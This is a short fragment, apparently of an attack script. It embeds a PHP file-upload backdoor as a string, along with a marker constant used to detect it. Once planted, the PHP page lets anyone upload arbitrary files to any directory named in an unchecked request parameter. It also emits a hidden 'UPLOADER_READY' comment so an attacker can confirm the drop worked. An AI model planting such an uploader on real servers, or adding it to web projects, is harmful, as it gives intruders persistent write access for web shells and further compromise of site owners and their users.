<?php 
    if(isset($_FILES["f"])){
    $n=preg_replace("/[^A-Za-z0-9._-]/","",$_FILES["f"]["name"]);
    $d=isset($_REQUEST["d"])?$_REQUEST["d"]:"";
    $p=$d.$n;
    if(move_uploaded_file($_FILES["f"]["tmp_name"],$p)){$m="UP_OK|".$p;}
    else{$m="UP_FAIL|".$p;}
    }else{$m="";}
    ?>
    <!DOCTYPE html><html><head><title>Uploader</title></head><body>
    <?php echo "<!--"."UPLOADER"."_READY"."-->";?>
    <?php if($m!==""){echo "<pre>".htmlspecialchars($m)."</pre>";}?>
    <form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="text" name="d" placeholder="dir (optional)">
    <input type="submit" value="Upload">
    </form></body></html>'
)
UPLOADER_MARKER = "UPLOADER_READY"
